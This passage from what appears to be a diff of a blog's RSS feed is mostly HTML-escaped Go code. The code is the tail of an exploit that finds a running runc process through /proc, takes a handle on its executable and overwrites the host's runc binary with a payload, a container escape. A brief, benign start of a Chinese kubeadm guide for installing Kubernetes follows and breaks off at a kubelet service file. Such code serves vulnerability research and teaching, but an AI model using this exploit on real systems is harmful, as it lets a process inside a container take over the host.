+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;37&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;found&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;38&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;pids&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ioutil&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;ReadDir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;/proc&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;39&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;40&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;41&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;42&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;43&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;range&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;pids&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;44&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fbytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;ioutil&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;ReadFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;/proc/&amp;#34;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Name&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;/cmdline&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;45&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fstring&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;fbytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;46&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;strings&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;fstring&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;runc&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;47&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;[+] Found the PID:&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Name&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;48&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;found&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;strconv&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Atoi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Name&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;49&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;50&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;51&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;52&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;53&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;54&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;55&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;56&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;57&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;// We will use the pid to get a file handle for runc on the host.&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;58&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;handleFd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;59&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;handleFd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;60&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;// Note, you do not need to use the O_PATH flag for the exploit to work.&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;61&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;os&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;OpenFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;/proc/&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;strconv&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Itoa&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;found&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;/exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;os&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;O_RDONLY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mo"&gt;0777&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;62&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Fd&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;63&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;handleFd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Fd&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;64&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;65&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;66&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;[+] Successfully got the file handle&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;67&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;68&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;// Now that we have the file handle, lets write to the runc binary and overwrite it&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;69&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;// It will maintain it&amp;#39;s executable flag&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;70&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;71&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;writeHandle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;os&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;OpenFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;/proc/self/fd/&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;strconv&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Itoa&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;handleFd&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;os&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;O_WRONLY&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;os&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;O_TRUNC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mo"&gt;0700&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;72&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;73&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;[-]Failed to open /proc/self/fd/%d: %v\n&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;handleFd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;74&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;time&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;time&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Second&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;75&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;76&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;77&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;writeHandle&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Fd&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;78&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;[+] Successfully got write handle&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;writeHandle&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;79&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;writeHandle&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;([]&lt;/span&gt;&lt;span class="nb"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;80&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;81&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;82&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;83&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>kubernetes安装指南</title><link>https://weizhang555.github.io/original/kubernetes-setup/</link><pubDate>Wed, 11 Dec 2019 11:11:00 +0800</pubDate><guid>https://weizhang555.github.io/original/kubernetes-setup/</guid><description>
+&lt;p&gt;本文介绍如何使用kubeadm安装一个简单的包含三个节点的集群。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="测试环境"&gt;测试环境&lt;/h2&gt;
+&lt;p&gt;三台VM，分别为test-vm, test-vm-1, test-vm-2，系统是ubuntu 19.04&lt;/p&gt;
+&lt;h2 id="下载"&gt;下载&lt;/h2&gt;
+&lt;p&gt;kubernetes的安装包，官方文档用apt get的方式，由于国内被墙了没法get到，可以直接从github上下载release包。把kubeadm，kubelet, kubectl装好就够了。docker当然也要装好。&lt;br /&gt;
+具体的安装步骤暂时略过。&lt;/p&gt;
+&lt;h2 id="配置kubelet"&gt;配置kubelet&lt;/h2&gt;
+&lt;p&gt;三台节点可以手动配置一下kubelet服务，配置方法都是一样的：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 1&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# cat &amp;gt; /lib/systemd/system/kubelet.service &amp;lt;&amp;lt; EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 2&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
